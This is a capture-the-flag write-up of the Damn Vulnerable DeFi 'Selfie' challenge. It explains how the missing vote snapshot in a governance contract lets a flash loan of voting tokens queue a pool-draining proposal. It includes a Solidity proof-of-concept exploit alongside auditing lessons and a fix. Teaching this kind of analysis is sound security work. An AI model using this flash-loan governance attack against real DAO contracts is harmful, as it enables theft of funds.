---
title: 'Damn Vulnerable DeFi - Selfie'
description: 'Governance hijacking via flash loans. Learn how a lack of snapshotting allows an attacker to borrow a majority of voting power and pass malicious proposals.'
date: 2025-06-28
tags: ['solidity', 'security', 'governance', 'flash-loan', 'snapshot', 'audit', 'damn-vulnerable-defi']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🤳 Selfie - Governance Hijacking Attack

## Challenge Overview

The `SelfiePool` holds 1.5 million `DamnValuableVotes` tokens. These tokens carry voting power in the `SimpleGovernance` contract. The pool has an `emergencyExit` function that can only be called by the governance contract.

**The Goal:** Drain the pool's assets and transfer them to the recovery account.

---

## Technical Analysis

### The Vulnerable Code: `SimpleGovernance.sol`

The core flaw is in the `queueAction` function and how it checks voting power:

```solidity
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    // [VULNERABILITY] Checks voting power only at the moment of proposal submission
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    // ...
}

function _hasEnoughVotes(address who) private view returns (bool) {
    // Reads CURRENT voting power, no snapshot or historical check
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

### Root Cause: Missing Snapshots

1.  **Instant Voting Power:** The governance contract checks the **current** balance of the user's voting power. It doesn't use a "snapshot" of a previous block or require the tokens to be held for a specific duration.
2.  **Flash Loan Synergy:** Since the `SelfiePool` offers flash loans of the very same voting tokens, an attacker can borrow a massive amount of tokens, instantly gaining the majority of the total voting supply.
3.  **Governance Delay Bypass:** While there is a 2-day delay between proposing and executing an action, the contract **only checks the voting power at the moment of proposal**. Once a proposal is in the queue, the attacker no longer needs to hold the tokens.

---

## The Exploit: The Governance Coup

1.  **Flash Loan:** Borrow 1.5 million tokens (the entire pool).
2.  **Delegate:** Call `delegate(address(this))` to activate the borrowed voting power for our own address.
3.  **Propose:** Call `queueAction` to propose a call to `pool.emergencyExit(recovery)`.
4.  **Repay:** Return the 1.5 million tokens to the pool within the same transaction.
5.  **Wait:** Wait for the 2-day governance time-lock to expire.
6.  **Execute:** Call `executeAction`. Since the proposal was already validated and queued, it executes perfectly, draining the pool.

---

## Proof of Concept (PoC)

```solidity
function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external override returns (bytes32) {
    // 1. Delegate voting power to ourselves
    token.delegate(address(this));
    
    // 2. Propose the malicious withdrawal
    bytes memory data = abi.encodeCall(pool.emergencyExit, recovery);
    actionId = governance.queueAction(address(pool), 0, data);
    
    // 3. Approve repayment
    token.approve(address(pool), amount);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

function test_selfie() public checkSolvedByPlayer {
    // 1. Trigger flash loan which submits the proposal
    pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
    
    // 2. Skip the 2-day time lock
    vm.warp(block.timestamp + 2 days);
    
    // 3. Execute the proposal
    governance.executeAction(actionId);
}
```

---

## Auditor's Lessons

1.  **Use Block Snapshots for Governance:** Voting power should always be calculated based on a **past block height** (e.g., using OpenZeppelin's `Votes` or `ERC20Votes`). This makes flash-loan hijacking impossible as the loan happened in the current block.
2.  **Require Token Locking:** Alternatively, require users to stake/lock their tokens for the entire duration of the proposal cycle.
3.  **Verify Proposal Eligibility at Execution:** Re-verify that the proposer or the supporting voters still hold sufficient balance during the execution phase.
4.  **Flash Loan Awareness:** Always assume any token with utility (voting, rewards, etc.) can be borrowed in massive quantities for a single transaction.

---

## Remediation

The most effective fix is to use a voting token that supports snapshots:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    // Use getPastVotes from a block PRIOR to the proposal block
    uint256 balance = _votingToken.getPastVotes(who, block.number - 1);
    return balance > _votingToken.getPastTotalSupply(block.number - 1) / 2;
}
```
